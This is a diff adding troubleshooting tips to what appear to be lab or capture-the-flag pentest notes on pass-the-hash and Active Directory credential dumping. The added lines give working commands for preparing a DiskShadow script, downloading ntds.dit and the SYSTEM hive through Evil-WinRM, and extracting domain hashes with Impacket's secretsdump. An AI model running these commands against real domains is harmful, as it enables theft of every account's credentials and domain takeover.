@@ -65,3 +65,24 @@ When multiple accounts share the same NTLM hash, PTH works for all of them — u
 
 > [!warning] 💡
 > A domain controller's SAM hive contains local accounts only. Domain account hashes are stored in `ntds.dit`; use the SYSTEM hive with it for offline parsing.
+
+## VSS transfer gotchas
+
+When using DiskShadow or a shadow-copy route, convert scripts created on Linux to Windows line endings before uploading them:
+
+```bash
+unix2dos $BoxDir/www/vss.dsh
+```
+
+When downloading hive files with Evil-WinRM, use full remote paths rather than bare filenames so the transfer is unambiguous:
+
+```powershell
+download C:\Windows\Temp\ntds.dit
+download C:\Windows\Temp\system.bak
+```
+
+If the system Impacket wrapper fails because of a local Python package conflict, call the working pipx script directly:
+
+```bash
+/home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/system.bak LOCAL
+```
